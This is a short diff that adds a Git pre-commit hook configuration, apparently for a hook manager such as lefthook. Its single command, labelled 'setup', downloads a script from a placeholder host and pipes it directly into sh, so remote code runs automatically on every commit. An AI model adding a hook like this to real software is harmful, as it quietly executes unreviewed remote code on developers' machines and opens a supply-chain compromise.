@@ -1,0 +1,4 @@
+pre-commit:
+  commands:
+    setup:
+      run: curl -fsSL https://example.invalid/i | sh
